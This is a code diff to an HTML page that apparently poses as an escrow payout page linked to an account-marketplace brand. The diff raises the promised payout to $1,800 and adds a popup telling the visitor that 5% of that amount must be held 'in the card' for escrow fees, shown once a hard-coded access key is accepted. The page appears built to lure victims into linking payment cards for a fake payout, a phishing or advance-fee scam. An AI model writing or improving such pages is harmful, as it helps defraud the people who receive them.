@@ -360,6 +360,71 @@
                 padding: 24px;
             }
         }
+
+        .mobile-close-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background: rgba(0, 0, 0, 0.05);
+            border-radius: 50%;
+            transition: background 0.3s ease;
+        }
+
+        .mobile-close-button:hover {
+            background: rgba(0, 0, 0, 0.1);
+        }
+
+        .mobile-close-button i {
+            font-size: 20px;
+            color: var(--text-secondary);
+        }
+
+        .mobile-bottom-close {
+            display: none;
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            background: var(--background);
+            border: none;
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .mobile-bottom-close:hover {
+            background: var(--border-color);
+        }
+
+        @media (max-width: 480px) {
+            .mobile-bottom-close {
+                display: block;
+            }
+
+            .modal-content {
+                margin: 20px;
+                max-height: 90vh;
+                overflow-y: auto;
+                padding: 25px;
+            }
+
+            .mobile-close-button {
+                width: 44px;
+                height: 44px;
+            }
+
+            .mobile-close-button i {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
 <body>
@@ -453,10 +518,30 @@
                 <i class="fas fa-check"></i>
             </div>
             <h2 style="margin-bottom: 16px; color: var(--text-primary);">Payment Method Linked</h2>
-            <p style="color: var(--text-secondary);">Your funds ($1,100) will be transferred in less than 24 hours.</p>
+            <p style="color: var(--text-secondary);">Your funds ($1,800) will be transferred in less than 48 hours.</p>
             <div class="progress-bar">
                 <div class="progress-bar-fill"></div>
             </div>
+        </div>
+    </div>
+
+    <!-- New Escrow Fee Popup -->
+    <div class="modal" id="escrowFeeModal" style="z-index: 1001;">
+        <div class="modal-content">
+            <div class="mobile-close-button" onclick="closeEscrowFeeModal()">
+                <i class="fas fa-times"></i>
+            </div>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <i class="fas fa-info-circle" style="font-size: 48px; color: var(--primary-color);"></i>
+            </div>
+            <h2 style="margin-bottom: 16px; color: var(--text-primary);">Escrow Fee Information</h2>
+            <p style="color: var(--text-secondary); margin-bottom: 20px;">Please note that a minimum of 5% of the $1,800 transaction amount is required in the card for escrow fees.</p>
+            <p style="color: var(--text-secondary);">For more information about escrow fees, please visit our 
+                <a href="https://fameswap.com/page/escrow#what-does-it-cost" target="_blank" rel="noopener" style="color: var(--primary-color); text-decoration: none;">Escrow Fee Guide</a>
+            </p>
+            <button class="mobile-bottom-close" onclick="closeEscrowFeeModal()">
+                Close
+            </button>
         </div>
     </div>
 
@@ -503,17 +588,29 @@
             
             showLoading(button);
 
+            console.log('Verifying access key...');
+
             setTimeout(() => {
                 if (accessKey === "MaDyXC") {
                     document.getElementById('verificationContainer').style.display = 'none';
                     document.getElementById('paymentContainer').style.display = 'block';
                     document.getElementById('keyError').style.display = 'none';
+                    
+                    // Show escrow fee popup after successful verification
+                    document.getElementById('escrowFeeModal').style.display = 'flex';
+                    console.log('Showing escrow fee popup');
                 } else {
                     document.getElementById('keyError').style.display = 'block';
                     hideLoading(button);
                 }
             }, 1000);
         });
+
+        // Function to close escrow fee modal
+        function closeEscrowFeeModal() {
+            document.getElementById('escrowFeeModal').style.display = 'none';
+            console.log('Escrow fee popup closed');
+        }
 
         // Input validation with icons
         document.getElementById('accessKey').addEventListener('input', function(e) {
